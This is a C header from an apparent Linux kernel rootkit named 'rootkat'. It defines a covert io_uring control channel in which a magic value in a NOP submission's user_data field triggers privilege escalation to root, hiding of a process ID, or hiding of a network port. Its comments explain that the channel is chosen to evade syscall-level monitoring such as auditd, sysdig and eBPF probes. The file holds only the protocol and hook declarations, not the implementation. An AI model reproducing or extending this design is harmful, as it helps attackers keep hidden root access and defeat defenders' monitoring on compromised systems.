/* SPDX-License-Identifier: MIT */
#ifndef ROOTKAT_HOOK_IO_ISSUE_SQE_H
#define ROOTKAT_HOOK_IO_ISSUE_SQE_H

/*
 * io_uring covert-channel control surface.
 *
 * Protocol: a userspace process submits an IORING_OP_NOP SQE whose
 * `user_data` field carries:
 *
 *   bits [63:32] = ROOTKAT_IO_MAGIC_HI ("rkat" = 0x726b6174)
 *   bits [31:24] = action code
 *   bits [23: 0] = action argument
 *
 * Action codes:
 *   1 = privesc caller to root
 *   2 = hide caller's PID
 *   3 = hide port (arg = port in low 16 bits of low 24)
 *
 * The action is delivered through the io_uring submission queue, so
 * syscall-level monitoring (auditd, sysdig with default ruleset, eBPF
 * probes on sys_enter_kill, etc.) does NOT observe it. The only syscall
 * the operator invokes is io_uring_enter, which is legitimate enough
 * that most rulesets don't flag every call.
 *
 * Restricted to IORING_OP_NOP to keep collision probability with
 * legitimate user_data values negligible — NOP is the safest opcode
 * to repurpose because a real NOP does literally nothing.
 */

#define ROOTKAT_IO_MAGIC_HI       0x726b6174u
#define ROOTKAT_IO_ACT_PRIVESC    1
#define ROOTKAT_IO_ACT_HIDE_PID   2
#define ROOTKAT_IO_ACT_HIDE_PORT  3

int rootkat_hook_io_issue_sqe_install(void);
void rootkat_hook_io_issue_sqe_remove(void);

#endif
